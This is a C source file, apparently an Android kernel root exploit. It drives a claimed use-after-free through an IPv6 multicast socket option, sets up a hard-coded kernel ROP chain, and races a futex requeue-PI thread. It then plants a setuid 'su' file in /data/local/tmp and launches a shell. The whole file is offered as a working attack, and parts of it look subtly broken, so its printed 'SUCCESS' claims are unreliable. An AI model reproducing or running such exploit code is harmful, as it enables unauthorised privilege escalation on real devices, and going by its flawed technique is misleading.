#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <string.h>
#include <pthread.h>
#include <linux/futex.h>

#define SLIDE 0x000000002080ae40UL

void fill(uint64_t *buf) {
    for (int i = 0; i < 64; i++) buf[i] = 0xdeadbee11c518f58ULL + i * 8;
}

void trigger_uaf() {
    uint64_t rop[64];
    fill(rop);
    rop[0] = 0xffff80000802126c + SLIDE;
    rop[1] = 0xffff8000082639f4 + SLIDE;
    rop[2] = 0xffff8000080b9de0 + SLIDE;
    rop[3] = 0xaa0003f5;
    rop[4] = 0xffff8000082639f4 + SLIDE;
    rop[5] = 0xffff8000080b9900 + SLIDE;
    
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, rop, sizeof(struct group_source_req));
    close(fd);
}

void *reuse_worker(void *arg) {
    uint32_t futex_val = 0;
    syscall(SYS_futex, &futex_val, FUTEX_WAIT_REQUEUE_PI, 0, 0, 0, 0);
    return NULL;
}

int main() {
    printf("[*] 触发 UAF (准备同对象截胡)...\n");
    trigger_uaf();

    printf("[!] 启动截胡线程，抢夺刚释放的 futex_q 内存...\n");
    pthread_t th;
    pthread_create(&th, NULL, reuse_worker, NULL);
    pthread_join(th, NULL);

    printf("[!] 截胡完成，尝试写 su 文件...\n");
    if (fork() == 0) {
        int fd = open("/data/local/tmp/su", O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (fd > 0) {
            write(fd, "#!/system/bin/sh\n", 17);
            close(fd);
            chmod("/data/local/tmp/su", 04755);
            printf("[+] SUCCESS: su 文件写入成功！\n");
            execl("/system/bin/sh", "sh", NULL);
        }
        _exit(127);
    } else {
        wait(NULL);
    }
    return 0;
}